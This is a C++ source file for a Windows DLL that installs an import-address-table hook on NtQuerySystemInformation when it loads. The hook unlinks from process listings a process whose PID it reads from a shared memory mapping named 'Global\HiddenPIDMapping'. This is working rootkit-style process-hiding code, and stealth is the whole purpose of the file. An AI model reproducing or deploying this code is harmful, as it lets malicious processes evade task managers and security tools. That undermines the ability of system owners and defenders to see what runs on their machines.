#include "pch.h"
#include "iat_hook.h"

#include <vector>
#include <string>

static iat_hook* g_NtQuerySystemInformation_hook = nullptr;
static int g_hidden_pid = 0;

static const std::string PID_MAPPING_NAME = "Global\\HiddenPIDMapping";

typedef long NTSTATUS;

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS       ((NTSTATUS)0x00000000L)
#endif

typedef enum _SYSTEM_INFORMATION_CLASS
{
    SystemBasicInformation,                         // 0x00 SYSTEM_BASIC_INFORMATION
    SystemProcessorInformation,                     // 0x01 SYSTEM_PROCESSOR_INFORMATION
    SystemPerformanceInformation,                   // 0x02
    SystemTimeOfDayInformation,                     // 0x03
    SystemPathInformation,                          // 0x04
    SystemProcessInformation,                       // 0x05
    SystemCallCountInformation,                     // 0x06
    SystemDeviceInformation,                        // 0x07
    SystemProcessorPerformanceInformation,          // 0x08
    SystemFlagsInformation,                         // 0x09
    SystemCallTimeInformation,                      // 0x0A
    SystemModuleInformation,                        // 0x0B SYSTEM_MODULE_INFORMATION
    SystemLocksInformation,                         // 0x0C
    SystemStackTraceInformation,                    // 0x0D
    SystemPagedPoolInformation,                     // 0x0E
    SystemNonPagedPoolInformation,                  // 0x0F
    SystemHandleInformation,                        // 0x10
    SystemObjectInformation,                        // 0x11
    SystemPageFileInformation,                      // 0x12
    SystemVdmInstemulInformation,                   // 0x13
    SystemVdmBopInformation,                        // 0x14
    SystemFileCacheInformation,                     // 0x15
    SystemPoolTagInformation,                       // 0x16
    SystemInterruptInformation,                     // 0x17
    SystemDpcBehaviorInformation,                   // 0x18
    SystemFullMemoryInformation,                    // 0x19
    SystemLoadGdiDriverInformation,                 // 0x1A
    SystemUnloadGdiDriverInformation,               // 0x1B
    SystemTimeAdjustmentInformation,                // 0x1C
    SystemSummaryMemoryInformation,                 // 0x1D
    SystemMirrorMemoryInformation,                  // 0x1E
    SystemPerformanceTraceInformation,              // 0x1F
    SystemObsolete0,                                // 0x20
    SystemExceptionInformation,                     // 0x21
    SystemCrashDumpStateInformation,                // 0x22
    SystemKernelDebuggerInformation,                // 0x23
    SystemContextSwitchInformation,                 // 0x24
    SystemRegistryQuotaInformation,                 // 0x25
    SystemExtendServiceTableInformation,            // 0x26
    SystemPrioritySeperation,                       // 0x27
    SystemPlugPlayBusInformation,                   // 0x28
    SystemDockInformation,                          // 0x29
    SystemPowerInformationNative,                   // 0x2A
    SystemProcessorSpeedInformation,                // 0x2B
    SystemCurrentTimeZoneInformation,               // 0x2C
    SystemLookasideInformation,                     // 0x2D
    SystemTimeSlipNotification,                     // 0x2E
    SystemSessionCreate,                            // 0x2F
    SystemSessionDetach,                            // 0x30
    SystemSessionInformation,                       // 0x31
    SystemRangeStartInformation,                    // 0x32
    SystemVerifierInformation,                      // 0x33
    SystemAddVerifier,                              // 0x34
    SystemSessionProcessesInformation,              // 0x35
    SystemLoadGdiDriverInSystemSpaceInformation,    // 0x36
    SystemNumaProcessorMap,                         // 0x37
    SystemPrefetcherInformation,                    // 0x38
    SystemExtendedProcessInformation,               // 0x39
    SystemRecommendedSharedDataAlignment,           // 0x3A
    SystemComPlusPackage,                           // 0x3B
    SystemNumaAvailableMemory,                      // 0x3C
    SystemProcessorPowerInformation,                // 0x3D
    SystemEmulationBasicInformation,                // 0x3E
    SystemEmulationProcessorInformation,            // 0x3F
    SystemExtendedHanfleInformation,                // 0x40
    SystemLostDelayedWriteInformation,              // 0x41
    SystemBigPoolInformation,                       // 0x42
    SystemSessionPoolTagInformation,                // 0x43
    SystemSessionMappedViewInformation,             // 0x44
    SystemHotpatchInformation,                      // 0x45
    SystemObjectSecurityMode,                       // 0x46
    SystemWatchDogTimerHandler,                     // 0x47
    SystemWatchDogTimerInformation,                 // 0x48
    SystemLogicalProcessorInformation,              // 0x49
    SystemWo64SharedInformationObosolete,           // 0x4A
    SystemRegisterFirmwareTableInformationHandler,  // 0x4B
    SystemFirmwareTableInformation,                 // 0x4C
    SystemModuleInformationEx,                      // 0x4D
    SystemVerifierTriageInformation,                // 0x4E
    SystemSuperfetchInformation,                    // 0x4F
    SystemMemoryListInformation,                    // 0x50
    SystemFileCacheInformationEx,                   // 0x51
    SystemThreadPriorityClientIdInformation,        // 0x52
    SystemProcessorIdleCycleTimeInformation,        // 0x53
    SystemVerifierCancellationInformation,          // 0x54
    SystemProcessorPowerInformationEx,              // 0x55
    SystemRefTraceInformation,                      // 0x56
    SystemSpecialPoolInformation,                   // 0x57
    SystemProcessIdInformation,                     // 0x58
    SystemErrorPortInformation,                     // 0x59
    SystemBootEnvironmentInformation,               // 0x5A SYSTEM_BOOT_ENVIRONMENT_INFORMATION
    SystemHypervisorInformation,                    // 0x5B
    SystemVerifierInformationEx,                    // 0x5C
    SystemTimeZoneInformation,                      // 0x5D
    SystemImageFileExecutionOptionsInformation,     // 0x5E
    SystemCoverageInformation,                      // 0x5F
    SystemPrefetchPathInformation,                  // 0x60
    SystemVerifierFaultsInformation,                // 0x61
    MaxSystemInfoClass                              // 0x67
} SYSTEM_INFORMATION_CLASS, * PSYSTEM_INFORMATION_CLASS;

typedef struct _UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;

} UNICODE_STRING, * PUNICODE_STRING;

typedef LONG KPRIORITY;

typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER SpareLi1;
    LARGE_INTEGER SpareLi2;
    LARGE_INTEGER SpareLi3;
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    KPRIORITY BasePriority;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
    ULONG HandleCount;
} SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;

typedef NTSTATUS (*WINAPI _NtQuerySystemInformation)(
    _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,
    _Inout_   PVOID                    SystemInformation,
    _In_      ULONG                    SystemInformationLength,
    _Out_opt_ PULONG                   ReturnLength
);

NTSTATUS WINAPI HookedNtQuerySystemInformation(
    _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,
    _Inout_   PVOID                    SystemInformation,
    _In_      ULONG                    SystemInformationLength,
    _Out_opt_ PULONG                   ReturnLength
    )
{
    auto status = reinterpret_cast<_NtQuerySystemInformation>(g_NtQuerySystemInformation_hook->get_original_function())(
        SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength);

    if (SystemInformationClass == SystemProcessInformation && NT_SUCCESS(status))
    {
        auto previous = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(SystemInformation);
        auto current = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(reinterpret_cast<unsigned char*>(previous) + previous->NextEntryOffset);

        while (previous->NextEntryOffset)
        {
            if (static_cast<int>(current->UniqueProcessId) == g_hidden_pid)
            {
                if (current->NextEntryOffset)
                {
                    previous->NextEntryOffset += current->NextEntryOffset;
                }
                else
                {
                    previous->NextEntryOffset = 0;
                }
            }

            previous = current;
            current = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(reinterpret_cast<unsigned char*>(previous) + previous->NextEntryOffset);
        }
    }

    return status;
}

bool get_hidden_pid()
{
    auto mapping_handle = ::OpenFileMappingA(
        FILE_MAP_READ,
        false,
        PID_MAPPING_NAME.c_str()
    );
    if (!mapping_handle)
    {
        return false;
    }

    auto p_hidden_pid = reinterpret_cast<int*>(::MapViewOfFile(
        mapping_handle,
        FILE_MAP_READ,
        0,
        0,
        sizeof(g_hidden_pid)
    ));
    if (!p_hidden_pid)
    {
        ::CloseHandle(mapping_handle);
        return false;
    }

    g_hidden_pid = *p_hidden_pid;

    ::UnmapViewOfFile(p_hidden_pid);
    ::CloseHandle(mapping_handle);

    return true;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        if (get_hidden_pid())
        {
            g_NtQuerySystemInformation_hook = new iat_hook(
                "NtQuerySystemInformation",
                &HookedNtQuerySystemInformation
            );
        }
        
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        if (g_NtQuerySystemInformation_hook)
        {
            delete g_NtQuerySystemInformation_hook;
        }

        break;
    }
    return TRUE;
}

